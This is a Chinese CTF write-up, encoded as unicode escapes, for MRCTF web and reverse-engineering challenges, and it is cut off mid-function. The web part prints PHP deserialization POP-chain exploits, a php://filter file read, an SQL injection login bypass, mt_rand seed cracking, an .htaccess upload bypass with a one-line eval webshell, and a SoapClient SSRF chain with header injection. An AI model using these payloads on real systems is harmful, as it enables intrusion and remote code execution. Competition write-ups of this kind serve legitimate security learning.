\u53ef\u4ee5\u5f53\u6570\u7ec4\uff0c\u53ef\u4ee5\u5f53md5\u78b0\u649e\uff0c\u53ef\u4ee5\u6784\u90200e\u5f00\u5934\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002 \u7b2c\u4e8c\u6b65\u7528\u8bed\u53e5\u7ed5\u8fc7 1234567|1=1 \u5373\u53ef\u5f97\u5230flag \u6bd4\u8f83\u7b80\u5355 EzPop \u4e3b\u8981\u8003\u5bdf\u5bf9php\u9b54\u672f\u5316\u65b9\u6cd5\u7684\u4e86\u89e3 \u63d0\u793a\u91cc\u6709\u53c2\u8003\u8d44\u6599\uff0c\u4e5f\u662f\u4e3a\u4e86\u953b\u70bc\u8d5b\u573a\u4e0a\u7684\u81ea\u5b66\u80fd\u529b\u5427 \u8003\u70b9\u5c31\u8fd9\u4e09\u4e2a \u53cd\u5e8f\u5217\u5316\u9b54\u672f\u65b9\u6cd5 __construct()//\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u88ab\u8c03\u7528 __destruct() //\u5f53\u4e00\u4e2a\u5bf9\u8c61\u9500\u6bc1\u65f6\u88ab\u8c03\u7528 __toString() //\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 __sleep()//\u5728\u5bf9\u8c61\u5728\u88ab\u5e8f\u5217\u5316\u4e4b\u524d\u8fd0\u884c __wakeup()//\u5c06\u5728\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u7acb\u5373\u88ab\u8c03\u7528(\u901a\u8fc7\u5e8f\u5217\u5316\u5bf9\u8c61\u5143\u7d20\u4e2a\u6570\u4e0d\u7b26\u6765\u7ed5\u8fc7) __get()//\u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u65f6\u8c03\u7528 __set()//\u8bbe\u7f6e\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u65f6\u8c03\u7528 __invoke()//\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\u7684\u56de\u5e94\u65b9\u6cd5 __call()//\u5f53\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u4e2d\u7684\u4e0d\u80fd\u7528\u7684\u65b9\u6cd5\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u51fd\u6570 public\u3001protected\u4e0eprivate\u5728\u5e8f\u5217\u5316\u65f6\u7684\u533a\u522b protected \u58f0\u660e\u7684\u5b57\u6bb5\u4e3a\u4fdd\u62a4\u5b57\u6bb5\uff0c\u5728\u6240\u58f0\u660e\u7684\u7c7b\u548c\u8be5\u7c7b\u7684\u5b50\u7c7b\u4e2d\u53ef\u89c1\uff0c\u4f46\u5728\u8be5\u7c7b\u7684\u5bf9\u8c61\u5b9e\u4f8b\u4e2d\u4e0d\u53ef\u89c1\u3002\u56e0\u6b64\u4fdd\u62a4\u5b57\u6bb5\u7684\u5b57\u6bb5\u540d\u5728\u5e8f\u5217\u5316\u65f6\uff0c\u5b57\u6bb5\u540d\u524d\u9762\u4f1a\u52a0\u4e0a\\0 \\0\u7684\u524d\u7f00\u3002\u8fd9\u91cc\u7684 \\0 \u8868\u793a ASCII \u7801\u4e3a 0 \u7684\u5b57\u7b26(\u4e0d\u53ef\u89c1\u5b57\u7b26)\uff0c\u800c\u4e0d\u662f \\0 \u7ec4\u5408\u3002\u8fd9\u4e5f\u8bb8\u89e3\u91ca\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5982\u679c\u76f4\u63a5\u5728\u7f51\u5740\u4e0a\uff0c\u4f20\u9012\\0 \\0username\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\\0\uff0c\u53ea\u662f\u7528\u5b83\u6765\u4ee3\u66ffASCII\u503c\u4e3a0\u7684\u5b57\u7b26\u3002\u5fc5\u987b\u7528python\u4f20\u503c\u624d\u53ef\u4ee5\u3002 BASE64 Wrapper LFI php://filter/convert.base64-encode/resource=flag.php Exp: <?php class Show{ public $source; public $str; } class Test{ public $p; } class Modifier{ protected $var; function __construct(){ $this->var=\"php://filter/convert.base64-encode/resource=flag.php\"; } } $s = new Show(); $t = new Test(); $r = new Modifier(); $t->p = $r; $s->str = $t; $s->source = $s; var_dump(urlencode(serialize($s))); ?> \u5206\u6790\uff1a <?php //flag is in flag.php //WTF IS THIS? //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value){ include($value);//8.\u89e6\u53d1\u8fd9\u4e2ainclude\uff0c\u5229\u7528php base64 wrapper \u8bfbflag } public function __invoke(){ $this->append($this->var);//7.\u7136\u540e\u4f1a\u8c03\u7528\u5230\u8fd9\u91cc } } class Show{ public $source; public $str; public function __construct($file='index.php'){ $this->source = $file; echo 'Welcome to '.$this->source.\"<br>\"; } public function __toString(){ return $this->str->source;//4.\u8fd9\u91cc\u4f1a\u8c03\u7528str->source\u7684__get \u90a3\u4e48\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u4e3aTest\u5bf9\u8c61 } public function __wakeup(){//2.\u5982\u679cpop\u662f\u4e2aShow,\u90a3\u4e48\u8c03\u7528\u8fd9\u91cc if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {//3.\u5339\u914d\u7684\u65f6\u5019\u4f1a\u8c03\u7528__toString echo \"hacker\"; $this->source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ $this->p = array(); } public function __get($key){ $function = $this->p;//5.\u89e6\u53d1\u5230\u8fd9\u91cc return $function();//6.()\u4f1a\u8c03\u7528__invoke,\u6211\u4eec\u8fd9\u91cc\u9009\u62e9Modifier\u5bf9\u8c61 } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']);//1.\u53cd\u5e8f\u5217\u8c03\u7528\u8fd9\u91cc } else{ $a=new Show; highlight_file(__FILE__); } \u6784\u9020\u5373\u53ef \u5957\u5a03 \u5728URL\u4e2dGET\u8bf7\u6c42\u5f53\u8f93\u5165 . \u6216\u8005 (\u7a7a\u683c)\u6216\u8005 _ \u90fd\u4f1a\u5ffd\u7565\uff0c\u56e0\u6b64 b_u_p_t ,\u5176\u5b9e\u5c31\u662f b u p t ,\u6b63\u5219\u7684\u610f\u601d\u662f\u5fc5\u987b\u898123333\u5f00\u5934\u548c\u7ed3\u5c3e\uff0c\u4f46\u662f\u503c\u4e0d\u80fd\u4e3a23333\uff0c\u8fd9\u4e2a\u65f6\u5019url\u7684%0A\u4e3a\u6362\u884c\u6c61\u67d3\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u6b63\u5219\uff0c\u4e14\u503c\u4e0d\u4e3a23333\u3002\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5957\u5a03\u3002jsfuck\u5728\u63a7\u5236\u5668\u8f93\u51fa\u53d1\u73b0POST Merak\u3002Post Merak=1\u5373\u53ef\u67e5\u770b\u6e90\u7801\u3002\u5224\u65ad\u610f\u56fe\u662f\u6a21\u62df\u672c\u5730\u7528\u6237\uff0c\u8fd9\u91cc\u6211\u7981\u4e86XFF\u5934\uff0c\u53ef\u4ee5\u7528Client-ip\u8fdb\u884c\u7ed5\u8fc7\u5373\u53ef\uff0c\u6700\u540e file_get_contents \u9700\u8981\u89e3\u5bc6\uff0cexp\u5982\u4e0b <?php function decode($v){ $v = base64_decode($v); $re = ''; for($i=0;$i<strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } function en_code($value){ $result = ''; for($i=0;$i<strlen($value);$i++){ $result .= chr(ord($value[$i]) - $i*2); } $result = base64_encode($result); return $result; } echo en_code(\"flag.php\"); ?> Ezaudit index\u9875\u9762\u662f\u4e00\u4e2a\u5565\u4e5f\u6ca1\u7528\u7684\u9875\u9762\uff0c\u9700\u8981\u626b\u540e\u53f0\uff0c\u53d1\u73b0\u5b58\u5728login.php\u4e3a\u7a7a\uff0c\u8003\u8651\u5230\u53ef\u80fd\u662f\u5904\u7406\u540e\u7aef,\u524d\u7aef\u5219\u662f login.html ,\u53d1\u73b0\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u767b\u5f55\u6846\uff0c\u53ea\u6709\u767b\u5f55\u6846\u60f3\u5230\u5927\u6982\u7387\u5b58\u5728\u6e90\u7801\u6cc4\u9732\uff0c\u53d1\u73b0 www.zip \u6587\u4ef6\uff0c\u5224\u65ad\u767b\u5f55\u903b\u8f91\u662fsql\u67e5\u8be2\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e07\u80fd\u5bc6\u7801\uff0c\u8fd8\u9700\u8981\u8f93\u5165\u5bc6\u94a5\uff0c\u8fd9\u91cc\u4ea7\u751f\u516c\u94a5\u548c\u79d8\u94a5\u7684\u673a\u5236\u90fd\u662f\u4f7f\u7528mt_rand\uff0c\u800c\u8fd9\u662f\u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u53ef\u4ee5\u8fdb\u884c\u7834\u89e3\uff0c\u77e5\u9053\u516c\u94a5\u540e\u5c06\u516c\u94a5\u8f6c\u5316\u6210 php_mt_seed \u683c\u5f0f\uff0c gayhub \u76f4\u63a5git clone\uff0c\u5f97\u5230\u79cd\u5b50\u540e\uff0c\u518d\u5c06\u5176\u751f\u621012\u4f4d\u5bc6\u94a5\u5373\u53ef\uff0c\u5177\u4f53\u539f\u7406:https://blog.csdn.net/crisprx/article/details/104306971 exp: <?php $str = \"KVQP0LdJKRaV3n9D\"; $randStr = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; for($i=0;$i<strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($randStr)-1).\" \"; //\u6574\u7406\u6210\u65b9\u4fbf php_mt_seed \u6d4b\u8bd5\u7684\u683c\u5f0f //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] } echo \"\\n\"; /** *\u7206\u7834\u5f97\u5230mt_srand = 1775196155 */ mt_srand(1775196155); function public_key($length = 16) { $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i < $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } /** * \u5148\u751f\u6210\u4e00\u6b21\u516c\u94a5\u5728\u751f\u6210\u4e00\u6b21\u5bc6\u94a5 XuNhoueCDCGc */ function private_key($length = 12) { $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i < $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } echo public_key(); echo \"\\n\"; echo private_key(); ?> \u4f60\u4f20\u4f60\ud83d\udc0e\u5462 \u5f88\u7ecf\u5178\u7684\u4e0a\u4f20\u7ed5\u8fc7\uff0c\u4e3b\u8981\u8003\u5bdf\u4e00\u4e0b\u57fa\u672c\u7684\u4e0a\u4f20\u7ed5\u8fc7\u6280\u80fd \u5229\u7528BurpSuite\u4fee\u6539MIME\u6b3a\u9a97\u540e\u7aef\u6587\u4ef6\u7c7b\u578b \u4fee\u6539 Content-Type: image/png \u7136\u540e\u5c31\u53ef\u4ee5\u4f20\u4efb\u610f\u6587\u4ef6\u540e\u7f00 \u5229\u7528.htaccess\u6765\u5236\u4f5c\u56fe\u7247\u9a6c \u589e\u52a0\u4f7f\u7528php\u89e3\u6790\u7684\u6587\u4ef6\u540e\u7f00(.jpg) AddType application/x-httpd-php .jpg \u7136\u540e\u518d\u5199\u4e2a\u4e00\u53e5\u8bdd <?php eval($_REQUEST['eki']);?> \u7528\u8681\u5251\u8fde\u4e0a\u5c31\u53ef\u4ee5\u4e86 Ezpop Revenge \u4e3b\u8981\u8003\u5bdfCMS\u5ba1\u8ba1\u80fd\u529b\u548cSSRF\u7684\u5e94\u7528 \u987a\u7740Typecho\u7684\u6e90\u7801\u641e\u7684 \u4eceGithub\u4e0a\u514b\u9686\u6e90\u7801\uff0c\u53d1\u73b01.2\u9884\u89c8\u7248\u8fd8\u67091.1\u7684POP\u94fe \u6539\u9020\u4e86\u4e00\u4e0b\u5165\u53e3,\u7136\u540e\u5957\u4e86SoapClient\u6765SSRF \u5165\u53e3\u70b9 //HelloWorld/Plugin.php if (isset($_POST['C0incid3nc3'])) { if(preg_match(\"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\\'~^?<>$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo \"Not that easy.\"; } //call_user_func(\"call_user_func\",array($a,\"233\")); } class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } \u8def\u7531\u70b9 //Typecho/Plugin.php Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action'); Pop\u94fe\u53ef\u4ee5\u53c2\u7167Exp: <?php class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __construct($coincidence){ $this->coincidence = $coincidence; } function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } class Typecho_Request{ private $_params; private $_filter; function __construct($params,$filter){ $this->_params=$params; $this->_filter=$filter; } } class Typecho_Feed{ private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item){ $this->_items[] = $item; } } $target = \"http://127.0.0.1/flag.php\"; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2' ); $a = new SoapClient(null,array('location' => $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); $payload1 = new Typecho_Request(array('screenName'=>array($a,\"233\")),array('call_user_func')); $payload2 = new Typecho_Feed(); $payload2->addItem(array('author' => $payload1)); $exp1 = array('hello' => $payload2, 'world' => 'typecho'); $exp = new HelloWorld_DB($exp1); echo serialize($exp).\"\\n\"; echo urlencode(base64_encode(serialize($exp))); \u53ef\u4ee5\u5206\u6790\u5185\u7f51\u5730\u5740 <?php if(!isset($_SESSION)) session_start(); if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ $_SESSION['flag']= \"MRCTF{Cr4zy_P0p_4nd_RCE}\"; }else echo \"\u6211\u624cyour problem?\\nonly localhost can get flag!\"; ?> \u8fd9\u4e5f\u662f\u4e3a\u5565cookie\u8981\u5e26session \u7528payload\u6253\u4e00\u6b21\u5237\u65b0\u4e0b\u9875\u9762var_dump()\u5c31\u4f1adumpflag\u51fa\u6765\u4e86 RE Xor(\u6821\u5185\u4e13\u4f9b) \u5f02\u6216\u4e00\u6b21\u540e\u7684\u6570\u636e\u518d\u5f02\u6216\u4e00\u6b21\u5373\u53ef\u5f97\u5230\u539f\u6570\u636e \u5c06\u8f93\u5165\u5b57\u7b26\u548c\u5e8f\u53f7\u8fdb\u884c\u5f02\u6216\uff0c\u518d\u4e0e\u76ee\u6807\u6570\u7ec4\u6bd4\u8f83 \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u76ee\u6807\u6570\u7ec4\u53cd\u8fc7\u6765\u518d\u6b21\u5f02\u6216\u5c31\u53ef\u4ee5\u5f97\u5230flag #include<cstdio> #include<cstring> #include<cstdlib> char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67}; int main() { for(int i=0;i<strlen(flag);i++) { unsigned char tmp=flag[i]; tmp^=i; printf(\"%c\",tmp); } return 0; } \u5f97\u5230flag:MRCTF{@_R3@1ly_E2_R3verse!} Transform \u5176\u5b9e\u5c31\u662f\u4e2a\u7b80\u5355\u7684\u5b57\u7b26\u7f6e\u6362\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u8f93\u5165\u6709\u89c4\u5f8b\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540edump\u51fa\u5904\u7406\u8fc7\u540e\u7684\u5b57\u7b26\u4e32 \u8fd9\u6837\u5c31\u77e5\u9053\u7f6e\u6362\u77e9\u9635\u4e86\uff0c\u62ff\u51fa\u6570\u636e\u7f6e\u6362\u4e00\u4e0b\uff0c\u5f02\u6216\u4e00\u4e0b\u5c31\u662fflag\u3002\u3002 \u64b8\u554a\u64b8 \u8fd9\u9053\u9898\u76ee\u5176\u5b9e\u9898\u76ee\u540d\u6709\u5f88\u5927\u7684\u63d0\u793a\uff0clua lu \u8fd9\u4e2a\u4f7f\u7528C++\u5185\u5d4clua\u5199\u7684\uff0c\u4e0d\u7136\u4e3a\u4ec0\u4e48\u4f1a\u663e\u793a\"I need My friend to help me check your flag!\" \u53ea\u9700\u8981\u6839\u636e\u5224\u65ad\u903b\u8f91\u9006\u5411\u601d\u8003\uff0c\u53ef\u4ee5\u770b\u51fasub_7FF650AFD980\u662f\u4e2a\u5f88\u91cd\u8981\u7684\u51fd\u6570 \u7136\u540e\u89c2\u5bdf\u5b83\u7684\u53c2\u6570\uff0c\u53d1\u73b0\u51fa\u5165\u4e86\u4e00\u4e2a\u4e71\u4e03\u516b\u7cdf\u7684\u5b57\u7b26\u4e32\u3002 \u770b\u4e0d\u51fa\u6765\u662f\u5565\uff0c\u4f46\u662f\u5982\u679c\u52a8\u8c03\uff0c\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u5b57\u7b26\u4e32\u88ab\u4fee\u6539\u4e86\uff0c\u770b\u7684\u61c2\u4e86 cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97} print(\"Give Me Your Flag LOL!:\") flag=io.read() if string.len(flag)~=29 then print(\"Wrong flag!\") os.exit() end for i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\"Wrong flag!\") os.exit() end end print(\"Right flag!\") os.exit() \u8fd9\u91cc\u7684~\u662f\u5f02\u6216\u7684\u610f\u601d\uff0c\u5c31\u5f88\u5bb9\u6613\u770b\u61c2\u4e86 EXP a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97] flag=\"\" for i in range(1,29): x=a[i-1] if i%2==0: x^=i else: x-=6 flag+=chr(x) print flag hello_world_go Golang\u9006\u5411 Golang\u7a0b\u5e8f\u53bb\u6389\u7b26\u53f7\u53ef\u4ee5\u8fd8\u539f\uff0cida\u4e0b\u6709\u811a\u672c IDAGolangHelper \u5e2e\u52a9\u6062\u590d\u7b26\u53f7\uff0c\u8fd0\u884c\u811a\u672c\u540e\u4ece\u4e0a\u5230\u4e0b\u70b9\u4e00\u904d\u6309\u94ae\u5c31\u8fd8\u539f\u4e862333 \u63a5\u4e0b\u6765\u5206\u6790\u7a0b\u5e8f\u903b\u8f91 \u53d1\u73b0\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u70b9\u8fdb\u53bb\u770b\u770b hard_to_go \u540c\u6837\u662fGolang\u9006\u5411 \u7531\u4e0a\u53ef\u7ee7\u7eed\u6062\u590d\u7b26\u53f7 \u5176\u5b9e\u5bf9\u4e8e\u9006\u5411golang\uff0c\u6709\u7684\u65f6\u5019\u4e0d\u80fd\u7eaf\u7528F5\u6765\u770b\u7a0b\u5e8f\u903b\u8f91\uff0c\u5c24\u5176\u4f20\u53c2\uff0c\u901a\u8fc7\u6c47\u7f16\u770b\u4f1a\u66f4\u597d\u7406\u89e3 \u8fd9\u91cc\u6211\u5bf9\u7740\u6e90\u7801\u8bb2\u89e3\u4e00\u4e0b\uff0c\u5728\u6bd4\u8d5b\u4e2d\u5927\u5bb6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u7f16\u8bd1\u76f8\u4f3c\u67b6\u6784\u7684\u76ee\u6807\u7a0b\u5e8f\u6765\u5206\u6790\u3002 NewCipher\u4f20\u53c2 move\u51fd\u6570\u4f20\u53c2 \u7531\u6b64\u53ef\u4ee5\u63a8\u6d4b\u51fa\u5b83\u7684\u4f20\u53c2\u89c4\u5f8b \u90a3\u4e2a\u505a\u51fa\u6765\u7684\u5e08\u5085\u662f\u76f4\u63a5\u627e\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f4d\u7f6e\u628aflag\u89e3\u51fa\u6765\u7684\uff0c\u8fd9\u4e2a...\u55ef..\u7b97\u662f\u975e\u9884\u671f\uff0c\u4e5f\u662f\u6211\u5927\u610f\u4e86\uff0c\u6211\u662f\u60f3\u8ba9\u5927\u5bb6\u53bb\u9006move\u8fd9\u4e2a\u51fd\u6570\u903b\u8f91\u7684\u3002 \u601d\u8def1(\u5b98\u65b9\u89e3\u6cd5): \u7b80\u5355\u770b\u4e00\u4e0bmove\u51fd\u6570\u903b\u8f91\uff0c\u5f80\u4e0b\u4e00\u7ffb\u53d1\u73b0\u662f\u9012\u5f52\uff0c\u518d\u770b\u9012\u5f52\u7684\u51fd\u6570\u8c03\u7528 \u6839\u636eGolang\u81ea\u5df1\u7684\u6570\u636e\u7ed3\u6784(\u8fd9\u4e2a\u6211\u5c31\u6ca1\u591a\u7814\u7a76\u4e86)\u53ef\u4ee5\u63a8\u65ad\u63a5\u4e0b\u6765\u8981\u6267\u884c\u7684\u51fd\u6570 move(arg0-1,arg1,arg3,arg2) move(arg0-1,arg2,arg1,arg3) \u53c8\u901a\u8fc7main\u4e2d\u8c03\u7528\u60c5\u51b5\u63a8\u65ad\u662f\u6c49\u8bfa\u5854\uff0c\u5230\u7f51\u4e0a\u6284\u4e00\u4e2a\u6c49\u8bfa\u5854\u4e0b\u6765\u7f16\u8bd1\u4e00\u4e0b\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u8fc7\u4e86 \u601d\u8def2(\u975e\u9884\u671f): \u901a\u8fc7\u8fd9\u4e2acompare\u53cd\u7740\u4e0b\u624b \u901a\u8fc7\u5206\u6790\u903b\u8f91\u53d1\u73b0\uff0cflag\u88abrc4\u52a0\u5bc6\u540e\u4e0e\u52a0\u5bc6\u540e\u7684\u8f93\u5165\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u6211\u4eec\u83b7\u5f97\u52a0\u5bc6\u540e\u7684\u6570\u636e\u518d\u89e3\u5bc6\u4e0d\u5c31\u62ff\u5230flag\u4e86 \u501f\u4e2a\u5e08\u5085\u7684 wp\u4ee3\u7801 ( lingze\u5e08\u5085\u7684wp \u4e5f\u5f88ok) package main import ( \"crypto/rc4\" \"fmt\" \"strconv\" ) func Hextob(str string)([]byte){ slen:=len(str) bHex:=make([]byte,len(str)/2) ii:=0 for i:=0;i<len(str);i=i+2 { if slen!=1{ ss:=string(str[i])+string(str[i+1]) bt,_:=strconv.ParseInt(ss,16,32) bHex[ii]=byte(bt) ii=ii+1; slen=slen-2;} } return bHex; } func BytetoH(b []byte)(H string){ H=fmt.Sprintf(\"%x\",b) return; } func main() { var key []byte = []byte(\"MRCTF_GOGOGO\") //\u521d\u59cb\u5316\u7528\u4e8e\u52a0\u5bc6\u7684KEY rc4obj1, _ := rc4.NewCipher(key) //\u8fd4\u56de Cipher rc4str1 := []byte(\"AAAABBBB\") //\u9700\u8981\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32 plaintext := make([]byte, len(rc4str1)) // rc4obj1.XORKeyStream(plaintext, rc4str1) stringinf1 := fmt.Sprintf(\"%x\\n\", plaintext) //\u8f6c\u6362\u5b57\u7b26\u4e32 fmt.Println(\"\u52a0\u5bc6\u540e:\"+stringinf1) var stringa=BytetoH(plaintext) fmt.Println(\"bytetohex:\"+stringa) var stringb=Hextob(\"7d306ec9cc03931e854d455fc546f4a8a03e11be70751da3cd7fffbd8112\") rc4obj2, _ := rc4.NewCipher(key) //\u8fd4\u56de Cipher rc4obj2.XORKeyStream(stringb, stringb) stringinf2 := fmt.Sprintf(\"%s\\n\", stringb) //\u8f6c\u6362\u5b57\u7b26\u4e32 PixelShooter \u8fd9\u9053\u9898\u76ee\u4f7f\u7528\u4e86Unity\u5199\u7684\u4e2a\u5c0f\u6e38\u620f \u8868\u9762\u4e0a\u662fapk\uff0c\u5176\u5b9e\u662f\u4e2aC#\u9006\u5411 \u5927\u90e8\u5206\u7684Unity\u90fd\u662f\u7528C#\u5199\u7684\uff0c\u5176\u4e2d\u6709\u4e2a\u5b58\u50a8\u903b\u8f91\u4ee3\u7801\u7684C#\u4e8c\u8fdb\u5236\u6587\u4ef6 Assembly-Csharp.dll \u6240\u4ee5\u53ea\u8981\u627e\u5230\u8fd9\u4e2a\u73a9\u610f\u5c31\u662f\u4e86 apk\u89e3\u5305\uff0cPixelShooter.apk\\assets\\bin\\Data\\Managed\u4e0b\u9762\u5c31\u662f\u4e86 dnspy\u6253\u5f00 \u5373\u53ef\u5728UIController\u4e0b\u627e\u5230flag MRCTF{Unity_1S_Fun_233} Junk \u8fd9\u9053\u9898\u5982\u540c\u5176\u540d\u5b57\uff0cJunk \u5f80\u91cc\u9762\u585e\u4e86\u5f88\u591aJunkCode\uff0c\u53ea\u8981\u4e00\u4e2a\u4e2a\u53bb\u6389\u5c31\u662f\u4e86\uff0cU\u548cC\u952e\u4ea4\u66ff(\u91cc\u9762\u63d2\u4e86\u8bb8\u591a0xE8\u5b57\u8282\u6765\u8ff7\u60d1IDA) \u987a\u4fbf\u628a\u4e00\u4e9b\u7a00\u91cc\u7cca\u6d82\u7684Call\u7ed9\u5220\u4e86(\u901a\u8fc7Call\u4e00\u4e2a\u51fd\u6570\uff0c\u51fd\u6570\u91cc\u4fee\u6539\u4e86EIP\u7684\u503c\uff0c\u8fdb\u884c\u8df3\u8f6c\uff0c\u8fd9\u4f1a\u5bfc\u81f4F5\u5206\u6790\u5931\u8d25) \u53ef\u4ee5\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u5f02\u6216 \u7136\u540e\u5b9e\u73b0\u4e86\u5faa\u73af\u5de6\u79fb\u548c\u53f3\u79fb\u7684\u64cd\u4f5c\uff0c\u9274\u4e8e\u4f4d\u79fb\u56db\u4f4d\uff0c\u5176\u5b9e\u5de6\u79fb\u53f3\u79fb\u90fd\u662f\u4e00\u6837\u7684 \u8fd9\u91cc\u8fd8\u6709\u4e2a\u5947\u602a\u7684\u51fd\u6570sub_B81090\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u4e86\u5947\u602a\u7684\u64cd\u4f5c \u70b9\u5f00\u770b\u770b char __fastcall sub_B81090(char *a1, int a2) { int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 >> 6) + 4 * (v21 & 0xF); v17 = (v21 >> 4) + 16 * (v20 & 3); v18 = (v22 >> 6) + 4 * (v21 & 0xF); v19 = v22 & 0x3F; v16 = v20 >> 2; byte_BA1708[v4] = byte_B9EA00[v20 >> 2]; byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 >> 4) + 16 * (v8 & 3))]; byte_BA170A[v4] = byte_B9EA00[v9]; byte_BA170B[v4] = byte_B9EA00[v6 & 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 >= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 < 3; do { if ( !v11 ) { sub_B8150A(a1); JUMPOUT(*(_DWORD *)algn_B811F3); } *(&v20 + v10++) = 0; v11 = (unsigned int)v10 < 3; } while ( v10 < 3 ); v12 = v22; v7 = v21; v8 = v20; } v16 = v8 >> 2; v17 = (v7 >> 4) + 16 * (v8 & 3); LOBYTE(v2) = v12 >> 6; v19 = v12 & 0x3F; v18 = (v12 >> 6) + 4 * (v7 & 0xF); for ( i = 0; i < v3 + 1; ++v4 ) { v2 = (unsigned __int8)*(&v16 + i++); LOBYTE(v2) = byte_B9EA00[v2]; byte_BA1708[v4] = v2; } if ( v3 < 3 ) LOBYTE(v2) = 